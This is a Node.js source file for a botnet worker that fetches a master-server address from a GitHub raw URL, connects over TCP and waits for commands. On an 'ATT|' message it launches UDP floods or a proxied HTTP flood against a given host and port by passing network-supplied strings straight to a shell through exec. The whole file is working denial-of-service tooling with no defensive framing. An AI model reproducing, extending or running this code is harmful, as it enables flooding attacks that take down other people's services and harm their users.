const util = require("util")
const net = require("net")
const fetch = require("node-fetch")
const chalk = require("chalk")
const chalkGradient = require("gradient-string")
const chalkAnimation = require("chalk-animation")
const { exec } = require("child_process")
const client = new net.Socket()

let HOST = "127.0.0.1"
let PORT = 7777

const METHODS = {
    "OVH-UDP": "screen -dmS %s ./methods/ovh-udp %s %i 4096 1 -1 %i",
    "UDP-RAPE": "screen -dmS %s ./methods/udp-rape %s %i 4096 1 -1 %i",
    "HTTP-FLOOD":
        'screen -dmS %s node browser/storm.js --url "%s" --host "ujustgotrekt.lol:%i" --time %i --mode socket --skip true --engine false --proxy browser/proxies.txt',
}

const ERRORS_TO_RETRY = [
    "ECONNRESET",
    "ETIMEDOUT",
    "ECONNRESET",
    "ECONNREFUSED",
]

const checkError = (error) =>
    ERRORS_TO_RETRY.some((err) => error.toString().includes(err))

const doConnect = function () {
    client.connect(PORT, HOST)
}

fetch("https://raw.githubusercontent.com/xIvan0ff/ServerManager/main/creds.txt")
    .then((res) => res.text())
    .then((text) => {
        if (!text.includes("404")) {
            const splittedData = text.split(":")
            // HOST = splittedData[0]
            // PORT = splittedData[1]
            console.log(
                chalk.grey(
                    `[${chalk.greenBright(
                        "+"
                    )}] Fetched master data: ${chalk.cyanBright(text)}.`
                )
            )
        } else {
            throw new Error("could not find data")
        }
    })
    .catch((e) => {
        console.log(
            chalk.grey(`[${chalk.redBright("-")}] Failed to fetch master data.`)
        )
        console.log(
            chalk.grey(
                `[${chalk.yellow(
                    "?"
                )}] Using default master data: ${chalk.cyanBright(
                    `${HOST}:${PORT}`
                )}.`
            )
        )
    })
    .then(() => {
        doConnect()
    })

client.on("connect", function () {
    console.log(chalk.grey(`[${chalk.greenBright("+")}] Connected to master.`))
    client.write("servConn")
})

client.on("data", function (data) {
    console.log("Received: " + data)
    const dataStr = data.toString()
    if (dataStr.startsWith("ATT|")) {
        const data = dataStr.slice(4).split("|")
        const method = data[0]
        const host = data[1]
        const port = data[2]
        const time = data[3]
        const cmd = util.format(METHODS[method], host, host, port, time)
        exec(cmd)
        console.log(
            chalk.grey(
                `[${chalk.greenBright("+")}] ${chalk.redBright(
                    "Attack"
                )} started on ${chalk.redBright(host)}:${chalk.redBright(
                    port
                )} for ${chalk.redBright(time)} seconds using ${chalk.redBright(
                    method
                )} method.`
            )
        )
    }
})

client.on("timeout", function () {
    console.log(
        chalk.grey(
            `[${chalk.redBright("-")}] Connection could not be established.`
        )
    )
    client.destroy()
})

client.on("close", function (err) {
    if (!err) {
        console.log(chalk.grey(`[${chalk.redBright("-")}] Connection closed.`))
    } else {
        console.log(
            chalk.grey(
                `[${chalk.redBright(
                    "-"
                )}] Connection could not be established. Retrying...`
            )
        )
        setTimeout(doConnect, 1000)
    }
})

client.on("error", function (err) {
    // if (checkError(err)) {
    //     console.log(
    //         chalk.grey(
    //             `[${chalk.redBright(
    //                 "-"
    //             )}] Connection could not be established. Retrying...`
    //         )
    //     )
    //     setTimeout(doConnect, 5000)
    // } else {
    //     console.log(
    //         chalk.grey(`[${chalk.redBright("-")}] Connection error. ${err}`)
    //     )
    // }
})
